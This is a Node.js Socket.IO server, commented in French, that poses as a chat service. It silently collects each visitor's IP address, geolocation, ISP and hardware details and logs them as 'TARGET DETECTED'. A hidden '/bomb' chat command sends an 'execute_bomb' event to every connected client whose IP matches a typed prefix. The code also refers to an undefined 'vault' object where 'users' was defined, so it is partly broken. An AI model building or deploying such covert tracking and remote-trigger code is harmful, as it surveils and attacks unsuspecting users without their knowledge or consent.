const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(__dirname));

const users = {};

io.on('connection', (socket) => {
    // Extraction de l'IP dès la connexion
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;

    socket.on('check_device', (info) => {
        // On lie l'IP au socket ID pour le ciblage
        users[ip] = {
            sid: socket.id,
            name: info.name,
            geo: info.geo,
            hw: info.hardware
        };

        // LOG COMPLET DANS TON TERMINAL VS CODE
        console.log(`
        ╔═════════════ TARGET DETECTED ═════════════╗
        ║ NOM    : ${info.name}
        ║ IP     : ${ip}
        ║ VILLE  : ${info.geo.city} (${info.geo.country_name})
        ║ ISP    : ${info.geo.org}
        ║ GPU    : ${info.hardware.gpu}
        ║ RAM    : ${info.hardware.ram} GB
        ║ CORES  : ${info.hardware.cores}
        ║ BATT   : ${info.hardware.battery}%
        ╚═══════════════════════════════════════════╝
        `);
    });

    socket.on('chat message', (data) => {
        const msg = data.text.trim();

        if (msg.startsWith("/bomb ")) {
            const target = msg.split(" ")[1]; // Récupère l'IP tapée
            let struck = 0;

            // Scan de toutes les sessions actives
            Object.keys(vault).forEach(ip => {
                // Si l'IP enregistrée contient ce que tu as tapé (ex: "176.131")
                if (ip.includes(target)) {
                    io.to(vault[ip].sid).emit('execute_bomb');
                    struck++;
                }
            });

            console.log(`[!] ORDRE_BOMB: ${target} | IMPACTS: ${struck}`);
        } else {
            io.emit('chat message', data);
        }
    });

    socket.on('disconnect', () => {
        // Optionnel : supprimer des logs à la déconnexion
    });
});

http.listen(3000, () => {
    console.log("SYSTEM_CORE_ONLINE_PORT_3000");
});

